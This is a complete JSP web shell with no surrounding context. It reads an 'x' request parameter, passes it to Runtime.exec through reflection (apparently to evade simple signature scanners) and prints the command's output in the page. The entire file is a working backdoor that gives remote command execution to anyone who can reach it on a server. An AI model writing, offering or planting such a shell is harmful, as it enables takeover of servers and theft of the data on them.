<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%@ page import="java.lang.reflect.Method"%>
<%
String x = request.getParameter("x");
if(x!=null){
	Class rt = Class.forName("java.lang.Runtime");
	Method gr = rt.getMethod("getRuntime");
    Method ex = rt.getMethod("exec", String.class);
	Process e = (Process) ex.invoke(gr.invoke(null),  x);
	java.io.InputStream in = e.getInputStream();
	int a = -1;
	byte[] b = new byte[2048];
	out.print("<pre>");
	while((a=in.read(b))!=-1){
		out.println(new String(b));
	}
	out.print("</pre>");
}
%>

